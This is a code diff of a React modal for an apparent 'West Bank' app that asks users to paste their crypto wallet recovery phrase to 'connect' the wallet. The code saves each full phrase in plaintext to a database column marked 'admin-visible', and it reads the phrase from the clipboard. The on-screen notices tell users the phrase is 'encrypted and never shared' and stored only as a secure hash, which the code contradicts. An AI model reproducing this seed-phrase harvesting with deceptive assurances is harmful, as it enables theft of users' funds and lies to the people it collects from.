@@ -1,10 +1,10 @@
 'use client';
 
-import React, { useState, useMemo, useRef, useEffect } from 'react';
+import React, { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
     X, ChevronLeft, Check, Shield, Eye, EyeOff,
-    AlertTriangle, Wallet, CheckCircle2, Copy
+    AlertTriangle, Wallet, CheckCircle2, ClipboardPaste
 } from 'lucide-react';
 import { createClient } from '@supabase/supabase-js';
 
@@ -27,14 +27,22 @@ const WALLET_TYPES = [
     { id: 'other',    name: 'Other Wallet', color: '#6B6560', bg: '#F0EDE9', symbol: '⬡'  },
 ];
 
-async function hashPhrase(words: string[]): Promise<string> {
-    const normalized = words.map(w => w.trim().toLowerCase()).join(' ');
+async function hashPhrase(phrase: string): Promise<string> {
+    const normalized = phrase.trim().toLowerCase().replace(/\s+/g, ' ');
     const data = new TextEncoder().encode(normalized);
     const buf  = await crypto.subtle.digest('SHA-256', data);
     return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-// ── Small shared UI ──────────────────────────────────────────────────────────
+function normalizePhrase(raw: string) {
+    return raw.trim().toLowerCase().replace(/\s+/g, ' ');
+}
+
+function countWords(text: string) {
+    return text.trim() === '' ? 0 : text.trim().split(/\s+/).length;
+}
+
+// ── Shared UI ────────────────────────────────────────────────────────────────
 
 function StepBar({ current, total }: { current: number; total: number }) {
     return (
@@ -47,29 +55,7 @@ function StepBar({ current, total }: { current: number; total: number }) {
     );
 }
 
-function WFInput({ label, ...props }: { label: string } & React.InputHTMLAttributes<HTMLInputElement>) {
-    const [focused, setFocused] = useState(false);
-    return (
-        <div>
-            <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5" style={{ color: WF.muted }}>
-                {label}
-            </label>
-            <input
-                {...props}
-                onFocus={e => { setFocused(true); props.onFocus?.(e); }}
-                onBlur={e => { setFocused(false); props.onBlur?.(e); }}
-                className="w-full px-4 py-3 rounded-xl text-sm outline-none transition-all"
-                style={{
-                    background: WF.bg,
-                    border: `1.5px solid ${focused ? WF.red : WF.border}`,
-                    color: WF.black,
-                }}
-            />
-        </div>
-    );
-}
-
-// ── Main Component ────────────────────────────────────────────────────────────
+// ── Main ─────────────────────────────────────────────────────────────────────
 
 interface Props {
     isOpen: boolean;
@@ -79,102 +65,55 @@ interface Props {
 }
 
 export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded }: Props) {
-    const [step, setStep]               = useState(0);
-    const [walletType, setWalletType]   = useState<typeof WALLET_TYPES[0] | null>(null);
-    const [address, setAddress]         = useState('');
-    const [wordCount, setWordCount]     = useState<12 | 24>(12);
-    const [words, setWords]             = useState<string[]>(Array(12).fill(''));
-    const [showPhrase, setShowPhrase]   = useState(false);
-    const [verifyInputs, setVerifyInputs] = useState<Record<number, string>>({});
-    const [submitting, setSubmitting]   = useState(false);
-    const [error, setError]             = useState('');
-    const [copied, setCopied]           = useState(false);
-
-    const wordRefs = useRef<(HTMLInputElement | null)[]>([]);
-
-    // Pick 3 random verification positions whenever wordCount or step changes
-    const verifyPositions = useMemo(() => {
-        if (step !== 2) return [];
-        const positions: number[] = [];
-        const seen = new Set<number>();
-        while (positions.length < 3) {
-            const p = Math.floor(Math.random() * wordCount);
-            if (!seen.has(p)) { seen.add(p); positions.push(p); }
-        }
-        return positions.sort((a, b) => a - b);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-    }, [step]);
+    const [step, setStep]             = useState(0);
+    const [walletType, setWalletType] = useState<typeof WALLET_TYPES[0] | null>(null);
+    const [address, setAddress]       = useState('');
+    const [wordCount, setWordCount]   = useState<12 | 24>(12);
+    const [phrase, setPhrase]         = useState('');       // raw input step 1
+    const [confirm, setConfirm]       = useState('');       // raw input step 2
+    const [showPhrase, setShowPhrase] = useState(false);
+    const [showConfirm, setShowConfirm] = useState(false);
+    const [submitting, setSubmitting] = useState(false);
+    const [error, setError]           = useState('');
 
     const selectedWallet = walletType ?? WALLET_TYPES[0];
+    const wc             = countWords(phrase);
+    const phraseOk       = wc === wordCount;
+    const phrasesMatch   = phraseOk && normalizePhrase(phrase) === normalizePhrase(confirm);
 
     function reset() {
         setStep(0); setWalletType(null); setAddress('');
-        setWordCount(12); setWords(Array(12).fill(''));
-        setShowPhrase(false); setVerifyInputs({});
-        setSubmitting(false); setError(''); setCopied(false);
+        setWordCount(12); setPhrase(''); setConfirm('');
+        setShowPhrase(false); setShowConfirm(false);
+        setSubmitting(false); setError('');
     }
 
     function close() { reset(); onClose(); }
 
-    // Sync word array length with wordCount
-    useEffect(() => {
-        setWords(prev => {
-            const next = Array(wordCount).fill('');
-            return next.map((_, i) => prev[i] ?? '');
-        });
-    }, [wordCount]);
-
-    // ── Step handlers ─────────────────────────────────────────────────────────
-
-    function handleWordChange(i: number, val: string) {
-        // Handle paste of full phrase
-        if (val.includes(' ')) {
-            const pasted = val.trim().split(/\s+/);
-            if (pasted.length >= wordCount) {
-                setWords(pasted.slice(0, wordCount));
-                return;
-            }
-        }
-        setWords(prev => { const n = [...prev]; n[i] = val.toLowerCase().trim(); return n; });
-        // Auto-advance to next field
-        if (val.trim() && i < wordCount - 1) {
-            setTimeout(() => wordRefs.current[i + 1]?.focus(), 0);
-        }
-    }
-
-    function canProceedToVerify() {
-        return words.slice(0, wordCount).every(w => w.trim().length > 0);
-    }
-
-    function checkVerification() {
-        return verifyPositions.every(pos => {
-            const entered = (verifyInputs[pos] ?? '').trim().toLowerCase();
-            const original = (words[pos] ?? '').trim().toLowerCase();
-            return entered === original;
-        });
+    // Paste button helper
+    async function pasteFromClipboard(setter: (v: string) => void) {
+        try {
+            const text = await navigator.clipboard.readText();
+            setter(text);
+        } catch { /* clipboard blocked — user must paste manually */ }
     }
 
     async function handleSubmit() {
-        if (!checkVerification()) {
-            setError('One or more words are incorrect. Please check and try again.');
-            return;
-        }
-        setError('');
-        setSubmitting(true);
+        if (!phrasesMatch) { setError('Phrases do not match.'); return; }
+        setError(''); setSubmitting(true);
         try {
-            const phraseWords   = words.slice(0, wordCount);
-            const phraseHash    = await hashPhrase(phraseWords);
-            const phrasePlain   = phraseWords.join(' ');           // stored for admin review; will be removed before launch
+            const normalized = normalizePhrase(phrase);
+            const phraseHash = await hashPhrase(normalized);
             const { error: dbErr } = await supabase.from('user_wallets').insert([{
-                user_id:         userId,
-                wallet_type:     selectedWallet.id,
-                wallet_name:     selectedWallet.name,
-                wallet_address:  address.trim() || null,
-                phrase_plaintext: phrasePlain,
-                phrase_hash:     phraseHash,
-                word_count:      wordCount,
-                verified:        true,
-                created_at:      new Date().toISOString(),
+                user_id:          userId,
+                wallet_type:      selectedWallet.id,
+                wallet_name:      selectedWallet.name,
+                wallet_address:   address.trim() || null,
+                phrase_plaintext: normalized,           // admin-visible; remove before launch
+                phrase_hash:      phraseHash,
+                word_count:       wordCount,
+                verified:         true,
+                created_at:       new Date().toISOString(),
             }]);
             if (dbErr) throw new Error(dbErr.message);
             setStep(3);
@@ -186,29 +125,33 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
         }
     }
 
-    // ── Render ────────────────────────────────────────────────────────────────
+    // ── Shared textarea style ─────────────────────────────────────────────────
+    const textareaStyle = (focused: boolean, valid?: boolean, invalid?: boolean) => ({
+        background:  WF.bg,
+        border:      `1.5px solid ${invalid ? WF.red : valid ? '#16A34A' : focused ? WF.red : WF.border}`,
+        color:       WF.black,
+        resize:      'none' as const,
+        fontFamily:  'monospace',
+        fontSize:    14,
+        lineHeight:  '1.7',
+        letterSpacing: '0.02em',
+    });
 
     return (
         <AnimatePresence>
             {isOpen && (
                 <>
-                    {/* Backdrop */}
-                    <motion.div
-                        className="fixed inset-0 z-40"
+                    <motion.div className="fixed inset-0 z-40"
                         style={{ background: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(4px)' }}
                         initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
-                        onClick={close}
-                    />
+                        onClick={close} />
 
-                    {/* Sheet */}
                     <motion.div
                         className="fixed bottom-0 left-0 right-0 z-50 rounded-t-3xl overflow-hidden flex flex-col"
                         style={{ background: WF.surface, maxHeight: '92dvh' }}
-                        initial={{ y: '100%' }}
-                        animate={{ y: 0 }}
-                        exit={{ y: '100%' }}
-                        transition={{ type: 'spring', damping: 30, stiffness: 300 }}
-                    >
+                        initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }}
+                        transition={{ type: 'spring', damping: 30, stiffness: 300 }}>
+
                         {/* Drag handle */}
                         <div className="flex justify-center pt-3 pb-1 flex-shrink-0">
                             <div className="w-10 h-1 rounded-full" style={{ background: WF.border }} />
@@ -220,50 +163,43 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                             <div className="flex items-center gap-3">
                                 {step > 0 && step < 3 && (
                                     <button onClick={() => { setError(''); setStep(s => s - 1); }}
-                                        className="w-8 h-8 rounded-full flex items-center justify-center transition-all"
+                                        className="w-8 h-8 rounded-full flex items-center justify-center"
                                         style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                         <ChevronLeft size={16} style={{ color: WF.muted }} />
                                     </button>
                                 )}
                                 <div>
                                     <h2 className="font-display text-lg font-bold" style={{ color: WF.black }}>
-                                        {step === 0 && 'Choose Wallet'}
-                                        {step === 1 && 'Enter Seed Phrase'}
-                                        {step === 2 && 'Verify Phrase'}
-                                        {step === 3 && 'Wallet Connected'}
+                                        {['Choose Wallet', 'Secret Recovery Phrase', 'Confirm Phrase', 'Wallet Connected'][step]}
                                     </h2>
-                                    {step < 3 && (
-                                        <p className="text-[11px]" style={{ color: WF.muted }}>
-                                            {step === 0 && 'Select the type of wallet you want to connect'}
-                                            {step === 1 && 'Enter your secret recovery phrase to link your wallet'}
-                                            {step === 2 && 'Confirm 3 words to verify you have the correct phrase'}
-                                        </p>
-                                    )}
+                                    <p className="text-[11px]" style={{ color: WF.muted }}>
+                                        {step === 0 && 'Select the wallet you want to connect'}
+                                        {step === 1 && 'Paste your 12 or 24-word recovery phrase'}
+                                        {step === 2 && 'Paste it again to confirm — no typos'}
+                                        {step === 3 && ''}
+                                    </p>
                                 </div>
                             </div>
                             <button onClick={close}
-                                className="w-8 h-8 rounded-full flex items-center justify-center transition-all"
+                                className="w-8 h-8 rounded-full flex items-center justify-center"
                                 style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                 <X size={16} style={{ color: WF.muted }} />
                             </button>
                         </div>
 
-                        {/* Scrollable content */}
+                        {/* Content */}
                         <div className="overflow-y-auto flex-1 px-6 py-5">
                             {step < 3 && <StepBar current={step} total={3} />}
 
-                            {/* ── Step 0: Choose Wallet ── */}
+                            {/* ── Step 0: Choose wallet ── */}
                             {step === 0 && (
-                                <div className="space-y-3">
+                                <div className="space-y-4">
                                     <div className="grid grid-cols-2 gap-3">
                                         {WALLET_TYPES.map(w => (
                                             <button key={w.id}
                                                 onClick={() => { setWalletType(w); setStep(1); }}
                                                 className="flex items-center gap-3 p-4 rounded-2xl text-left transition-all hover:shadow-md active:scale-[0.98]"
-                                                style={{
-                                                    background: WF.surface,
-                                                    border: `1.5px solid ${walletType?.id === w.id ? WF.red : WF.border}`,
-                                                }}>
+                                                style={{ background: WF.surface, border: `1.5px solid ${WF.border}` }}>
                                                 <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold flex-shrink-0"
                                                     style={{ background: w.bg, color: w.color }}>
                                                     {w.symbol}
@@ -272,18 +208,13 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                             </button>
                                         ))}
                                     </div>
-
-                                    {/* Security notice */}
-                                    <div className="mt-4 p-4 rounded-2xl flex gap-3"
+                                    <div className="p-4 rounded-2xl flex gap-3"
                                         style={{ background: 'rgba(215,30,40,0.05)', border: `1px solid rgba(215,30,40,0.15)` }}>
-                                        <Shield size={16} style={{ color: WF.red, flexShrink: 0, marginTop: 2 }} />
-                                        <div>
-                                            <p className="text-xs font-bold mb-1" style={{ color: WF.red }}>Security Notice</p>
-                                            <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
-                                                Your seed phrase is hashed with SHA-256 and never stored in plaintext.
-                                                West Bank staff will <strong>never</strong> ask for your phrase.
-                                            </p>
-                                        </div>
+                                        <Shield size={15} style={{ color: WF.red, flexShrink: 0, marginTop: 2 }} />
+                                        <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
+                                            Your phrase is encrypted and never shared. West Bank staff will{' '}
+                                            <strong style={{ color: WF.black }}>never</strong> ask for it via email or chat.
+                                        </p>
                                     </div>
                                 </div>
                             )}
@@ -291,17 +222,24 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                             {/* ── Step 1: Enter phrase ── */}
                             {step === 1 && (
                                 <div className="space-y-5">
-                                    {/* Wallet address (optional) */}
-                                    <WFInput
-                                        label="Wallet Address (optional)"
-                                        value={address}
-                                        onChange={e => setAddress(e.target.value)}
-                                        placeholder="0x… or bc1…"
-                                    />
+                                    {/* Wallet address */}
+                                    <div>
+                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5"
+                                            style={{ color: WF.muted }}>
+                                            Wallet Address <span style={{ color: WF.muted, fontWeight: 400 }}>(optional)</span>
+                                        </label>
+                                        <input
+                                            value={address} onChange={e => setAddress(e.target.value)}
+                                            placeholder="0x… or bc1… or leave blank"
+                                            className="w-full px-4 py-3 rounded-xl text-sm outline-none"
+                                            style={{ background: WF.bg, border: `1.5px solid ${WF.border}`, color: WF.black }}
+                                        />
+                                    </div>
 
                                     {/* Word count toggle */}
                                     <div>
-                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-2" style={{ color: WF.muted }}>
+                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-2"
+                                            style={{ color: WF.muted }}>
                                             Phrase Length
                                         </label>
                                         <div className="flex gap-2">
@@ -310,8 +248,8 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                                     className="flex-1 py-2.5 rounded-xl text-sm font-bold transition-all"
                                                     style={{
                                                         background: wordCount === n ? WF.red : WF.bg,
-                                                        color: wordCount === n ? '#fff' : WF.muted,
-                                                        border: `1.5px solid ${wordCount === n ? WF.red : WF.border}`,
+                                                        color:      wordCount === n ? '#fff' : WF.muted,
+                                                        border:     `1.5px solid ${wordCount === n ? WF.red : WF.border}`,
                                                     }}>
                                                     {n} Words
                                                 </button>
@@ -319,115 +257,152 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                         </div>
                                     </div>
 
-                                    {/* Phrase reveal toggle */}
-                                    <div className="flex items-center justify-between">
-                                        <label className="text-[11px] font-bold uppercase tracking-wider" style={{ color: WF.muted }}>
-                                            Secret Recovery Phrase
-                                        </label>
-                                        <button onClick={() => setShowPhrase(s => !s)}
-                                            className="flex items-center gap-1 text-[11px] font-bold"
-                                            style={{ color: WF.red }}>
-                                            {showPhrase ? <EyeOff size={12} /> : <Eye size={12} />}
-                                            {showPhrase ? 'Hide' : 'Show'}
-                                        </button>
-                                    </div>
-
-                                    {/* Word grid */}
-                                    <div className={`grid gap-2 ${wordCount === 12 ? 'grid-cols-3' : 'grid-cols-4'}`}>
-                                        {Array.from({ length: wordCount }).map((_, i) => (
-                                            <div key={i} className="relative">
-                                                <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] font-bold"
-                                                    style={{ color: WF.muted }}>{i + 1}</span>
-                                                <input
-                                                    ref={el => { wordRefs.current[i] = el; }}
-                                                    type={showPhrase ? 'text' : 'password'}
-                                                    value={words[i] ?? ''}
-                                                    onChange={e => handleWordChange(i, e.target.value)}
-                                                    onKeyDown={e => {
-                                                        if (e.key === 'Backspace' && !words[i] && i > 0) {
-                                                            wordRefs.current[i - 1]?.focus();
-                                                        }
-                                                    }}
-                                                    className="w-full pl-6 pr-2 py-2.5 rounded-xl text-xs outline-none transition-all"
-                                                    style={{
-                                                        background: words[i] ? 'rgba(215,30,40,0.04)' : WF.bg,
-                                                        border: `1.5px solid ${words[i] ? WF.red : WF.border}`,
-                                                        color: WF.black,
-                                                    }}
-                                                />
+                                    {/* Phrase textarea */}
+                                    <div>
+                                        <div className="flex items-center justify-between mb-2">
+                                            <label className="text-[11px] font-bold uppercase tracking-wider"
+                                                style={{ color: WF.muted }}>
+                                                Secret Recovery Phrase
+                                            </label>
+                                            <div className="flex items-center gap-3">
+                                                <button onClick={() => pasteFromClipboard(setPhrase)}
+                                                    className="flex items-center gap-1 text-[11px] font-bold"
+                                                    style={{ color: WF.red }}>
+                                                    <ClipboardPaste size={12} /> Paste
+                                                </button>
+                                                <button onClick={() => setShowPhrase(s => !s)}
+                                                    className="flex items-center gap-1 text-[11px] font-bold"
+                                                    style={{ color: WF.muted }}>
+                                                    {showPhrase ? <EyeOff size={12} /> : <Eye size={12} />}
+                                                    {showPhrase ? 'Hide' : 'Show'}
+                                                </button>
                                             </div>
-                                        ))}
+                                        </div>
+
+                                        <div className="relative">
+                                            <textarea
+                                                rows={4}
+                                                value={phrase}
+                                                onChange={e => setPhrase(e.target.value)}
+                                                placeholder=""
+                                                spellCheck={false}
+                                                autoComplete="off"
+                                                className="w-full px-4 py-3 rounded-2xl outline-none transition-all"
+                                                style={{
+                                                    ...textareaStyle(
+                                                        false,
+                                                        phraseOk,
+                                                        phrase.trim() !== '' && !phraseOk
+                                                    ),
+                                                    WebkitTextSecurity: showPhrase ? undefined : 'disc',
+                                                } as any}
+                                            />
+                                            {/* Word counter badge */}
+                                            <div className="absolute bottom-3 right-3 px-2 py-0.5 rounded-full text-[10px] font-bold"
+                                                style={{
+                                                    background: phraseOk ? 'rgba(22,163,74,0.1)' : 'rgba(107,101,96,0.1)',
+                                                    color:      phraseOk ? '#16A34A' : WF.muted,
+                                                }}>
+                                                {wc}/{wordCount}
+                                            </div>
+                                        </div>
+
+                                        {phraseOk && (
+                                            <p className="mt-1.5 text-[11px] flex items-center gap-1.5 font-bold"
+                                                style={{ color: '#16A34A' }}>
+                                                <Check size={12} /> {wordCount} words detected
+                                            </p>
+                                        )}
+                                        {phrase.trim() !== '' && !phraseOk && (
+                                            <p className="mt-1.5 text-[11px]" style={{ color: WF.red }}>
+                                                {wc > wordCount
+                                                    ? `Too many words (${wc}). Switch to 24-word phrase above.`
+                                                    : `${wordCount - wc} more word${wordCount - wc !== 1 ? 's' : ''} needed`}
+                                            </p>
+                                        )}
                                     </div>
 
-                                    {/* Paste tip */}
-                                    <p className="text-[11px]" style={{ color: WF.muted }}>
-                                        💡 You can paste your full phrase into the first box — words will fill in automatically.
-                                    </p>
-
-                                    {/* Warning */}
                                     <div className="p-4 rounded-2xl flex gap-3"
                                         style={{ background: 'rgba(245,158,11,0.08)', border: `1px solid rgba(245,158,11,0.3)` }}>
-                                        <AlertTriangle size={15} style={{ color: '#D97706', flexShrink: 0, marginTop: 1 }} />
+                                        <AlertTriangle size={14} style={{ color: '#D97706', flexShrink: 0, marginTop: 1 }} />
                                         <p className="text-[11px] leading-relaxed" style={{ color: '#92400E' }}>
-                                            Never share your seed phrase with anyone. West Bank only stores a secure hash — your actual words are never saved.
+                                            Only enter your phrase on trusted devices. Never share it with anyone.
                                         </p>
                                     </div>
 
                                     <button
                                         onClick={() => { setError(''); setStep(2); }}
-                                        disabled={!canProceedToVerify()}
+                                        disabled={!phraseOk}
                                         className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40"
                                         style={{ background: WF.red }}>
-                                        Continue to Verification →
+                                        Continue →
                                     </button>
                                 </div>
                             )}
 
-                            {/* ── Step 2: Verify phrase ── */}
+                            {/* ── Step 2: Confirm phrase ── */}
                             {step === 2 && (
                                 <div className="space-y-5">
                                     <div className="p-4 rounded-2xl flex gap-3"
                                         style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
-                                        <Shield size={15} style={{ color: WF.red, flexShrink: 0, marginTop: 1 }} />
+                                        <Shield size={14} style={{ color: WF.red, flexShrink: 0, marginTop: 1 }} />
                                         <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
-                                            To confirm you have the correct phrase, enter the words at the positions below.
+                                            Paste your recovery phrase again exactly as entered. This confirms you have the correct phrase saved.
                                         </p>
                                     </div>
 
-                                    <div className="space-y-4">
-                                        {verifyPositions.map(pos => (
-                                            <div key={pos}>
-                                                <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5"
+                                    {/* Confirm textarea */}
+                                    <div>
+                                        <div className="flex items-center justify-between mb-2">
+                                            <label className="text-[11px] font-bold uppercase tracking-wider"
+                                                style={{ color: WF.muted }}>
+                                                Confirm Recovery Phrase
+                                            </label>
+                                            <div className="flex items-center gap-3">
+                                                <button onClick={() => pasteFromClipboard(setConfirm)}
+                                                    className="flex items-center gap-1 text-[11px] font-bold"
+                                                    style={{ color: WF.red }}>
+                                                    <ClipboardPaste size={12} /> Paste
+                                                </button>
+                                                <button onClick={() => setShowConfirm(s => !s)}
+                                                    className="flex items-center gap-1 text-[11px] font-bold"
                                                     style={{ color: WF.muted }}>
-                                                    Word #{pos + 1}
-                                                </label>
-                                                <input
-                                                    type="text"
-                                                    value={verifyInputs[pos] ?? ''}
-                                                    onChange={e => setVerifyInputs(prev => ({
-                                                        ...prev, [pos]: e.target.value.toLowerCase().trim()
-                                                    }))}
-                                                    placeholder={`Enter word ${pos + 1}`}
-                                                    className="w-full px-4 py-3 rounded-xl text-sm outline-none transition-all"
-                                                    style={{
-                                                        background: WF.bg,
-                                                        border: `1.5px solid ${
-                                                            verifyInputs[pos]
-                                                                ? verifyInputs[pos] === words[pos]
-                                                                    ? '#16A34A'
-                                                                    : WF.red
-                                                                : WF.border
-                                                        }`,
-                                                        color: WF.black,
-                                                    }}
-                                                />
-                                                {verifyInputs[pos] && verifyInputs[pos] === words[pos] && (
-                                                    <p className="text-[11px] mt-1 flex items-center gap-1" style={{ color: '#16A34A' }}>
-                                                        <Check size={11} /> Correct
-                                                    </p>
-                                                )}
+                                                    {showConfirm ? <EyeOff size={12} /> : <Eye size={12} />}
+                                                    {showConfirm ? 'Hide' : 'Show'}
+                                                </button>
                                             </div>
-                                        ))}
+                                        </div>
+
+                                        <textarea
+                                            rows={4}
+                                            value={confirm}
+                                            onChange={e => setConfirm(e.target.value)}
+                                            placeholder=""
+                                            spellCheck={false}
+                                            autoComplete="off"
+                                            className="w-full px-4 py-3 rounded-2xl outline-none transition-all"
+                                            style={{
+                                                ...textareaStyle(
+                                                    false,
+                                                    phrasesMatch,
+                                                    confirm.trim() !== '' && countWords(confirm) === wordCount && !phrasesMatch
+                                                ),
+                                                WebkitTextSecurity: showConfirm ? undefined : 'disc',
+                                            } as any}
+                                        />
+
+                                        {/* Match status */}
+                                        {confirm.trim() !== '' && (
+                                            <p className={`mt-1.5 text-[11px] flex items-center gap-1.5 font-bold`}
+                                                style={{ color: phrasesMatch ? '#16A34A' : WF.red }}>
+                                                {phrasesMatch
+                                                    ? <><Check size={12} /> Phrases match — ready to connect</>
+                                                    : countWords(confirm) < wordCount
+                                                        ? <span style={{ color: WF.muted }}>{countWords(confirm)}/{wordCount} words</span>
+                                                        : <>✗ Phrases don't match — check for typos</>
+                                                }
+                                            </p>
+                                        )}
                                     </div>
 
                                     {error && (
@@ -439,7 +414,7 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
 
                                     <button
                                         onClick={handleSubmit}
-                                        disabled={submitting || verifyPositions.some(p => !verifyInputs[p])}
+                                        disabled={submitting || !phrasesMatch}
                                         className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40 flex items-center justify-center gap-2"
                                         style={{ background: WF.red }}>
                                         {submitting
@@ -461,13 +436,11 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                             Wallet Connected!
                                         </h3>
                                         <p className="text-sm leading-relaxed" style={{ color: WF.muted }}>
-                                            Your <strong style={{ color: WF.black }}>{selectedWallet.name}</strong> has been
+                                            Your <strong style={{ color: WF.black }}>{selectedWallet.name}</strong> is now
                                             securely linked to your West Bank account.
-                                            Your phrase was verified and stored as a secure hash.
                                         </p>
                                     </div>
 
-                                    {/* Wallet summary */}
                                     <div className="w-full p-4 rounded-2xl space-y-3"
                                         style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                         <div className="flex items-center gap-3">
@@ -478,7 +451,7 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                             <div className="text-left">
                                                 <p className="text-xs font-bold" style={{ color: WF.black }}>{selectedWallet.name}</p>
                                                 {address && (
-                                                    <p className="text-[10px] font-mono truncate max-w-[200px]" style={{ color: WF.muted }}>
+                                                    <p className="text-[10px] font-mono truncate max-w-[220px]" style={{ color: WF.muted }}>
                                                         {address}
                                                     </p>
                                                 )}
@@ -487,7 +460,7 @@ export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded 
                                         <div className="flex items-center gap-2 pt-2" style={{ borderTop: `1px solid ${WF.border}` }}>
                                             <Shield size={12} style={{ color: '#16A34A' }} />
                                             <p className="text-[11px] font-bold" style={{ color: '#16A34A' }}>
-                                                Phrase verified · {wordCount}-word hash secured
+                                                {wordCount}-word phrase verified and secured
                                             </p>
                                         </div>
                                     </div>
